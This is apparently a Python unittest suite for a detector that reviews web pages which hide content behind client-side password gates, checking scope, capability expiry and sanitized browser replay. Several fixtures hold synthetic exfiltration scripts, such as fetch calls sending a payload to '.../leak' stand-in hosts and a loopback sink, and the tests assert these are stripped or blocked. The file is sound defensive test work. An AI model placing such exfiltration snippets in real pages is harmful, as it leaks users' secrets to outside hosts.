"""T11–T16: no live hosts, credentials, or network access."""
from datetime import datetime, timedelta, timezone
from contextlib import nullcontext
import hashlib
import importlib.util
import json
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from threading import Thread
import unittest
from unittest.mock import patch

from sudetect.gate_review import _run_fixed_gate, review_gate
from sudetect.policy import Scope

URL = "https://gate.example.test/app"
CANARY = "SU_DETECT_SYNTHETIC_RATE_17_PERCENT"
HIDDEN = f'<main id="login-screen"><input id="password" type="password"></main><section id="app" style="display:none"><table><tr><th>수수료</th><td>17%</td></tr></table><p>{CANARY}</p></section>'
FIXED = "<script>const password = document.getElementById('password').value; if (password === 'SYNTHETIC_ONLY_PASS') { document.getElementById('login-screen').remove(); document.getElementById('app').style.display = 'flex'; }</script>"


def scope():
    return Scope.from_dict({
        "policy_id": "gate-test", "expires_at": (datetime.now(timezone.utc) + timedelta(days=1)).isoformat(),
        "targets": [{"origin": "https://gate.example.test", "owner": "synthetic-owner",
                     "ownership_evidence": "fixture-evidence", "path_prefixes": ["/app"]}],
        "max_bytes": 1048576, "max_requests": 1,
    })


def cap(body, *, action="reveal_delivered_content", url=URL, expires=None):
    return {"capability_id": "gate-cap-1", "policy_id": "gate-test", "action": action,
            "target_url": url, "owner_evidence_ref": "synthetic-owner",
            "expires_at": expires or (datetime.now(timezone.utc) + timedelta(hours=1)).isoformat(),
            "max_attempts": 1, "response_sha256": hashlib.sha256(body).hexdigest()}


def scoped_cap(*, action="reveal_delivered_content", policy_id="gate-test", expires=None):
    return {"policy_id": policy_id, "action": action,
            "valid_until": expires or (datetime.now(timezone.utc) + timedelta(hours=1)).isoformat(),
            "authorization_ref": "approved-synthetic-scope"}


class GateReviewTests(unittest.TestCase):
    def test_t11_delivered_hidden_payload_and_local_display(self):
        body = HIDDEN.encode()
        static = review_gate(body, "text/html", URL, scope(), cap(body), replay_browser=False)
        self.assertEqual(static["status"], "partial")
        self.assertTrue(static["payload_in_initial_response"])
        self.assertEqual(static["response_sha256"], hashlib.sha256(body).hexdigest())
        self.assertEqual(static["actual_data_access_result"], "delivered_in_initial_response")
        self.assertFalse(static["server_authorization_tested"])
        self.assertNotIn(CANARY, json.dumps(static))
        if importlib.util.find_spec("playwright"):
            replay = review_gate(body, "text/html", URL, scope(), cap(body), replay_browser=True)
            self.assertEqual(replay["status"], "reviewed")
            self.assertEqual(replay["network_request_attempts"], 0)
            self.assertEqual(replay["replay"], "local_display_confirmed")

    def test_t12_fixed_literal_one_model_attempt_with_no_value_output(self):
        body = (HIDDEN + FIXED).encode()
        result = review_gate(body, "text/html", URL, scope(), cap(body, action="verify_fixed_client_gate"), replay_browser=False)
        self.assertEqual(result["client_gate_attempts"], 0)
        self.assertTrue(result["client_secret_literal_present"])
        self.assertFalse(result["client_gate_tested"])
        self.assertTrue(result["content_evidence_refs"])
        self.assertNotIn("SYNTHETIC_ONLY_PASS", json.dumps(result))
        with patch("sudetect.gate_review._run_fixed_gate", return_value=(True, 0)) as broker:
            isolated = review_gate(body, "text/html", URL, scope(),
                                   cap(body, action="verify_fixed_client_gate"), replay_browser=True)
        broker.assert_called_once()
        self.assertTrue(isolated["client_gate_tested"])
        self.assertEqual(isolated["client_gate_attempts"], 1)
        self.assertNotIn("SYNTHETIC_ONLY_PASS", json.dumps(isolated))
        if importlib.util.find_spec("playwright"):
            replay = review_gate(body, "text/html", URL, scope(),
                                 cap(body, action="verify_fixed_client_gate"), replay_browser=True)
            self.assertEqual(replay["client_gate_attempts"], 1)
            self.assertTrue(replay["client_gate_tested"])
            self.assertEqual(replay["network_request_attempts"], 0)

    def test_t13_server_request_does_not_count_as_authorization(self):
        body = (HIDDEN + "<script>fetch('/api/data')</script>").encode()
        result = review_gate(body, "text/html", URL, scope(), cap(body, action="verify_fixed_client_gate"), replay_browser=False)
        self.assertTrue(result["request_present"])
        self.assertFalse(result["login_request_present"])
        self.assertFalse(result["server_authorization_tested"])
        self.assertFalse(result["client_gate_tested"])
        self.assertEqual(result["reason"], "unsupported_client_gate")
        self.assertIn("server_authorization_review", result["follow_up"])

    def test_literal_candidate_is_independent_of_executable_gate_and_login_request(self):
        body = b'<input type="password"><script>const PASSWORD = "SYNTHETIC_ONLY_PASS"; fetch("/api/login", {method:"POST"})</script>'
        result = review_gate(body, "text/html", URL, scope(), None)
        self.assertTrue(result["client_secret_literal_present"])
        self.assertTrue(result["request_present"])
        self.assertTrue(result["login_request_present"])
        self.assertFalse(result["client_gate_tested"])
        self.assertNotIn("SYNTHETIC_ONLY_PASS", json.dumps(result))

    def test_t14_ciphertext_indicator_fake_indicator_and_template(self):
        ciphertext = b'<input type="password"><script>ciphertext="' + b'A' * 64 + b'"</script>'
        encrypted = review_gate(ciphertext, "text/html", URL, scope(), None)
        self.assertTrue(encrypted["encrypted_payload_observed"])
        self.assertFalse(encrypted["payload_in_initial_response"])
        fake = review_gate(b'<p>encrypted</p>', "text/html", URL, scope(), None)
        self.assertFalse(fake["encrypted_payload_observed"])
        template = review_gate(b'<section id="app"><th>commission</th><td></td></section>', "text/html", URL, scope(), None)
        self.assertTrue(template["payload_template_only"])
        self.assertFalse(template["payload_in_initial_response"])

    def test_t15_malicious_markup_never_executes_or_requests(self):
        body = (HIDDEN + '<script>fetch("https://other.example.test/leak"); window.open("https://other.example.test"); navigator.serviceWorker.register("/sw.js")</script>').encode()
        before = {"targets": {"app": {"visible": False}}}
        after = {"targets": {"app": {"visible": True}}}
        with patch("sudetect.gate_review._browser_replay", return_value=(before, after, 0)) as browser:
            result = review_gate(body, "text/html", URL, scope(), cap(body), replay_browser=True)
        browser.assert_called_once()
        projection = browser.call_args.args[0]
        self.assertNotIn("<script", projection)
        self.assertNotIn("other.example.test", projection)
        self.assertEqual(result["replay_source"], "sanitized_hidden_text_projection")
        self.assertTrue(result["original_active_content_stripped"])
        self.assertFalse(result["original_dom_replayed"])
        self.assertEqual(result["network_request_attempts"], 0)

    def test_t16_scope_expiry_and_cross_service_rejected_independently(self):
        body = HIDDEN.encode()
        good_scope = scope()
        for target, capability, expected in [
            ("https://other.example.test/app", cap(body), "scope_denied"),
            (URL, cap(body, url="https://other.example.test/app"), "target_or_response_mismatch"),
            (URL, cap(body, expires="2000-01-01T00:00:00Z"), "expired_capability"),
        ]:
            with self.subTest(expected=expected):
                result = review_gate(body, "text/html", target, good_scope, capability)
                self.assertEqual(result["reason"], expected)
                self.assertEqual(result["network_request_attempts"], 0)
        self.assertEqual(review_gate(body, "text/html", URL, good_scope, cap(body), replay_browser=False)["status"], "partial")

    def test_static_signals_without_capability(self):
        body = HIDDEN.encode()
        result = review_gate(body, "text/html", URL, scope(), None)
        self.assertEqual(result["reason"], "capability_required")
        self.assertTrue(result["payload_in_initial_response"])
        self.assertEqual(result["replay"], "not_attempted")

    def test_scoped_capability_covers_newly_discovered_pages_and_binds_each_response(self):
        first = HIDDEN.encode()
        second = HIDDEN.replace("17%", "19%").encode()
        allowed = scope()
        capability = scoped_cap()
        a = review_gate(first, "text/html", URL, allowed, capability, replay_browser=False)
        b = review_gate(second, "text/html", URL + "/new", allowed, capability, replay_browser=False)
        self.assertEqual((a["status"], b["status"]), ("partial", "partial"))
        self.assertNotEqual(a["review_binding_sha256"], b["review_binding_sha256"])
        self.assertNotEqual(a["response_sha256"], b["response_sha256"])
        self.assertEqual(review_gate(second, "text/html", "https://other.example.test/app", allowed, capability)["reason"], "scope_denied")
        self.assertEqual(review_gate(first, "text/html", URL, allowed, scoped_cap(policy_id="other-policy"))["reason"], "capability_mismatch")
        self.assertEqual(review_gate(first, "text/html", URL, allowed, scoped_cap(expires="2000-01-01T00:00:00Z"))["reason"], "expired_capability")

    def test_generic_hidden_fields_are_static_evidence_without_replay_ids(self):
        body = b'<div hidden><input type="hidden" name="commission_rate" value="17%"><p>customer contract</p></div>'
        result = review_gate(body, "text/html", URL, scope(), scoped_cap(), replay_browser=False)
        self.assertEqual(result["status"], "partial")
        self.assertEqual(result["reason"], "replay_text_unavailable")
        self.assertEqual(result["hidden_field_count"], 1)
        self.assertEqual(result["hidden_filled_field_count"], 1)
        self.assertTrue(result["payload_in_initial_response"])
        self.assertEqual(result["actual_data_access_result"], "delivered_in_initial_response")
        self.assertNotIn("17%", json.dumps(result))

    def test_authorized_default_attempt_and_browser_failure_are_safe_pending(self):
        body = HIDDEN.encode()
        with patch("sudetect.gate_review._browser_replay", side_effect=RuntimeError("RAW SECRET")) as browser:
            result = review_gate(body, "text/html", URL, scope(), scoped_cap())
        browser.assert_called_once()
        self.assertEqual(result["status"], "pending")
        self.assertEqual(result["reason"], "replay_unavailable_or_failed")
        self.assertNotIn("RAW SECRET", json.dumps(result))

    def test_malformed_local_markup_and_capability_return_safe_result(self):
        body = b'<input type><section id hidden><p>commission 17%</p></section>'
        result = review_gate(body, "text/html", URL, scope(), None)
        self.assertEqual(result["reason"], "capability_required")
        self.assertNotIn("17%", json.dumps(result))
        bad = scoped_cap()
        bad["valid_until"] = 123
        result = review_gate(body, "text/html", URL, scope(), bad)
        self.assertEqual(result["reason"], "invalid_capability")


@unittest.skipUnless(importlib.util.find_spec("playwright"), "optional Playwright not installed")
class GateReviewChromiumTests(unittest.TestCase):
    def browser_environment(self):
        browser_path = Path(__file__).resolve().parents[1] / "_local" / "playwright-browsers"
        return patch.dict(os.environ, {"PLAYWRIGHT_BROWSERS_PATH": str(browser_path)}) if browser_path.is_dir() else nullcontext()

    def test_real_reveal_and_fixed_gate_have_no_network_attempts_or_secret_output(self):
        with self.browser_environment():
            reveal_body = HIDDEN.encode()
            revealed = review_gate(reveal_body, "text/html", URL, scope(), scoped_cap())
            fixed_body = (HIDDEN + FIXED).encode()
            fixed = review_gate(fixed_body, "text/html", URL, scope(),
                                scoped_cap(action="verify_fixed_client_gate"))
        self.assertEqual(revealed["status"], "reviewed")
        self.assertEqual(fixed["status"], "reviewed")
        self.assertEqual((revealed["network_request_attempts"], fixed["network_request_attempts"]), (0, 0))
        self.assertTrue(fixed["client_gate_tested"])
        self.assertEqual(fixed["client_gate_attempts"], 1)
        self.assertNotIn("SYNTHETIC_ONLY_PASS", json.dumps(fixed))
        self.assertNotIn(CANARY, json.dumps(revealed))

    def test_real_generic_hidden_text_projection_strips_original_scripts(self):
        body = ('<div id="private" style="display:none"><p>수수료 17%</p></div>'
                '<script src="https://blocked.example.test/active.js"></script>'
                '<script>fetch("https://blocked.example.test/leak?payload=SYNTHETIC_ONLY_PASS")</script>').encode()
        with self.browser_environment():
            result = review_gate(body, "text/html", URL, scope(), scoped_cap())
        self.assertEqual(result["status"], "reviewed")
        self.assertEqual(result["replay_source"], "sanitized_hidden_text_projection")
        self.assertTrue(result["original_active_content_stripped"])
        self.assertFalse(result["original_dom_replayed"])
        self.assertEqual(result["network_request_attempts"], 0)
        self.assertNotIn("SYNTHETIC_ONLY_PASS", json.dumps(result))

    def test_real_browser_blocks_synthetic_egress_before_receiver(self):
        received = []

        class Receiver(BaseHTTPRequestHandler):
            def do_GET(self):
                received.append(self.path)
                self.send_response(204)
                self.end_headers()

            def log_message(self, *args):
                pass

        try:
            server = ThreadingHTTPServer(("127.0.0.1", 0), Receiver)
        except OSError:
            self.skipTest("loopback fixture unavailable")
        thread = Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            script = ("const password = document.getElementById('password').value; "
                      "if (password === 'SYNTHETIC_ONLY_PASS') { document.getElementById('login-screen').remove(); "
                      "document.getElementById('app').style.display = 'flex'; } "
                      f"fetch('http://127.0.0.1:{server.server_port}/sink?payload=SYNTHETIC_ONLY_PASS').catch(()=>{{}});")
            with self.browser_environment():
                opened, blocked_requests = _run_fixed_gate(HIDDEN, script, "SYNTHETIC_ONLY_PASS")
            self.assertTrue(opened)
            self.assertGreaterEqual(blocked_requests, 1)
            self.assertEqual(received, [])
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=2)


if __name__ == "__main__":
    unittest.main()
